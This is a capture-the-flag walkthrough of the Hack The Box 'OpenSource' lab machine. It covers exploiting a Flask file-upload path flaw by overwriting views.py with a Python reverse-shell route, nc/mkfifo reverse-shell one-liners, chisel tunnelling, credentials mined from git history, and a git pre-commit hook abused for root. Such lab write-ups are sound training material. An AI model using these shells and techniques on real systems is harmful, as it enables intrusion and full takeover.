---
title: "HTB - OpenSource"
categories: [box]
date: 2022-10-29
comments: true
image: /images/walkthroughs/hackthebox/opensource/logo.png
favicon: /images/walkthroughs/hackthebox/opensource/logo.png
description: HTB - OpenSource walkthrough
---

# OpenSource

<p align="center">
  <img src="/images/walkthroughs/hackthebox/opensource/banner.png" width="70%"/>
</p>


## Summary

OpenSource is an easy machine where we have to take over a vulnerable file upload. In this case, we can replace any file in the server by exploiting the vulnerable use of the os.path.join() argument position and the poor input filtering. We use it to upload a new views.py with a custom path to create a revshell with python and we get acces to the docket where the server is running. We recall the port 3000 filtered at the nmap enumeration, so we used chisel to create a SSH tunnel to reach that, finding a Git-Tea website. Checking the source code downloaded from the webpage (yes, it was an app feature) we discover the .git folder with credentials deleted on previous commits. Using those credentials we get into the Git-Tea account and find the dev01 SSH keys within one of the repos.

Once inside we can see (with pspy32) that the user root makes a git commit over the git-sync folder. We used one of the GTFOBins for git, in this case, the pre-commit basj script that will be executed automatically when git commit is executed. Placing our revshell on that file we get our shell with root permissions.


## Enumeration

nmap:

```bash
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp   open     http    Werkzeug/2.1.2 Python/3.10.3
|_http-title: upcloud - Upload files for Free!
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Sun, 12 Jun 2022 09:11:48 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Sun, 12 Jun 2022 09:11:48 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
3000/tcp filtered ppp
```

Gobuster:

```bash
gobuster dir -u "http://10.10.11.164" --wordlist=/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 10 -x html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.164
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,txt
[+] Timeout:                 10s
===============================================================
2022/06/12 12:02:19 Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 200) [Size: 2489147]
/console              (Status: 200) [Size: 1563] 
```


Nmap shows that there is a website running _Werkzeug/2.1.2_ and also the port 3000 filtered. On the website we can see something about an aaplication called updown:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/opensource/1_0_web.png" width="90%"/>
</p>


We can see the /console endpoint on the website along the /download one. Visiting the /console endpoint we see it is protected with a PIN.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/opensource/1_0_locked_cmd.png" width="90%"/>
</p>

We can upload files in the following interface:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/opensource/1_1_upload.png" width="90%"/>
</p>


From http://10.10.11.164/download we can download the source code, let's take a look at it:


On the views.py we can see the file upload and I can bypass the upload path. The _os.path.join()_ has a user controlled argument with no filtering, that means that if we input "/home" all the previous parts will be ignored and the resulting path will be "/home":


```python
@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')
```

So using that, I can probably replace the script views.py and maybe get some execution. This will only work if the app is on debug mode and currently it is since we get the debug screen when an error occurs.

<p align="center">
  <img src="/images/walkthroughs/hackthebox/opensource/4_1_error.png" width="90%"/>
</p>

In that screenshot we see that the app is in **/app/app/views.py** so I will prepare a views.py script to replace it and include a custom method to execute certain code on the parameters. You can get a sample of a Python revshell on [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python). We are using the original wies.py from the source code previously downloaded:

```python
import os
import socket
import subprocess
from app.utils import get_file_name
from flask import render_template, request, send_file
from app import app

@app.route('/')
def index():
    return render_template('index.html')


@app.route('/download')
def download():
    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))


@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')

@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

@app.route('/shell')
def get_shell():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",1234))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
    return p  
```

Then, intercept the upload to the server and used filename="/app/app/views.py" so it replaces the actual file

<p align="center">
  <img src="/images/walkthroughs/hackthebox/opensource/5_0_uploaded.png" width="90%"/>
</p>


Then, use the payload to get a reverse shell:

```bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.67 5454 >/tmp/f

# Use this request to get the revshell

curl http://10.10.11.164/shell?k=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E10%2E14%2E2%205454%20%3E%2Ftmp%2Ff

```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/opensource/6_0_in.png" width="70%"/>
</p>

We knew that the app was in docker so we land as root within the docker. There is not much within, so I remembered the port 3000 on the host, so let's use _chisel_ to check what's there.


Upload [chisel](https://github.com/jpillora/chisel/releases/tag/v1.7.7) with the upload utility in the app:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/opensource/7_1_chisel_up.png" width="90%"/>
</p>

Now get all set up. Remember that the host is on the IP 172.17.0.1 by default on docker setups:

```bash
# On our attack machine
./chisel server --reverse --port 5455

# On the host
chmod +x chisel
./chisel client 10.10.14.2:5455 R:3000:172.17.0.1:3000
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/opensource/7_3_connected.png" width="70%"/>
</p>

Once is set up, let's check the website:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/opensource/7_4_gittea.png" width="90%"/>
</p>


We can see this Gittea site, an app like GitLab. It ask for credentials, so maybe some further enumeration over the downloaded source code might leak credentials or valuable information. I tried gitleaks over the source code but didn't display anything. Let's do manual enumeration.

First we can see the .git folder. These are the commands and the intentions behind them:

- git status : Check current status of the repo (sometimes you have a staged commit and can restore that information)
- git branch : Check if there are any other branches, in this case we have _dev_, very eye-catching name.
- git checkout dev : Change to HEAD pointer on _dev_ branch
- git log -p : Check commits and the diff with previous commit

We can see that they activated the debug option on the environment variables:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/opensource/1_2_git_dev.png" width="70%"/>
</p>

Going down on the files at the _.gitignore changes_ commit we actually see the following credentials on the _.vscode_ settings file:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/opensource/1_3_git_leak.png" width="70%"/>
</p>


```json
{
  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
  "http.proxyStrictSSL": false
}

```

**dev01:Soulless_Developer#2022**

They are the credentials to config the Git server, so let's use them on GitTea

<p align="center">
  <img src="/images/walkthroughs/hackthebox/opensource/7_5_log.png" width="90%"/>
</p>

And the credentials worked:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/opensource/7_6_in_as_dev01.png" width="90%"/>
</p>

Messing around the differnet repos and commits we found a private key. 

<p align="center">
  <img src="/images/walkthroughs/hackthebox/opensource/7_7_idrsa.png" width="90%"/>
</p>

Now we can use it to SSH as dev01 into the machine:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/opensource/8_0_user.png" width="90%"/>
</p>


``` c180f7ca29bfe2be53f58b28fd269ac2 ```


# Priv esc


I loaded pspy32 into the machine and saw the _/usr/local/bin/git-sync_ command and the _git commit_ with a kind of backup running as root. 

<p align="center">
  <img src="/images/walkthroughs/hackthebox/opensource/9_0_gitsync.png" width="80%"/>
</p>

This git-sync has the following content:

```bash
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi
```


We can use the [GTFO bins for git](https://gtfobins.github.io/gtfobins/git/). Actually, there is a set of commands that will run automatically before making the commit. To do it follow the instructions:


```bash
cd /home/dev01
git status 
cd .git/hooks
nano pre-commit.sample

# Add your revshell to the beginning
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.67 5455 >/tmp/f

# Change the name to pre-commit so it is executed
mv pre-commit.sample pre-commit

# Create your listener and wait for the call
nc -lvnp 5455
```

And we are in after some minutes:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/opensource/10_root.png" width="95%"/>
</p>


``` 3fafdbc164c04e617df5cb09cc0f67f7 ```


That's all, thanks for reading!